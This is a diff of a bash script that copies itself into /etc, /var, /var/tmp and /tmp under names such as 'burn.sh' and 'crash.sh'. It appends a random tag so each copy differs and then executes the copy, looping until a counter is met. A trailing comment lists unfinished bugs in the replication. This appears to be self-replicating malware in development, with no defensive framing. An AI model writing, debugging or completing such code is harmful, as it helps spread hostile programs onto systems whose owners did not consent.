@@ -2,18 +2,16 @@
 
 dirs=("/etc" "/var" "/var/tmp" "/tmp")
 names=("float.sh" "sink.sh" "burn.sh" "crash.sh")
-append=("AAAA" "BBBB" "CCCC" "DDDD" "EEEE" "FFFF" "aaaa" "bbbb" "cccc" "dddd" "eeee" "ffff")
-rando=${names[RANDOM%4]}
+append=("#AAAA" "#BBBB" "#CCCC" "#DDDD" "#EEEE" "#FFFF" "#aaaa" "#bbbb" "#cccc" "#dddd" "#eeee" "#ffff")
 rappend=${append[RANDOM%12]}
 counter=0
 
 replicate() {
-	for dir in ${dirs[@]}; do
-        	cp ${0} "$dir/$rando" 2>/dev/null && echo "$rappend" >> "$dir/$rando" && "$dir/$rando"
-		if [ $? -eq 0 ]; then
-			break
-		fi
-	done
+	rdir=${dirs[RANDOM%4]}
+	rando=${names[RANDOM%4]}
+	cp ${0} "$rdir/$rando" 2>/dev/null
+	echo "$rappend" >> "$rdir/$rando"
+	bash "$rdir/$rando"
 	return
 }
 
@@ -28,9 +26,9 @@ checker(){
 	done
 }
 
-checker
-if [ $counter -lt 2 ]; then
+while [ $counter -lt 2 ]; do
+	checker
 	replicate
-fi
+done
 
-# 3 problems: Error message on the Append, Spawned replicant is not running, Replication is happening twice
+# 3 problems: Spawned replicant is not running, Replication is happening twice
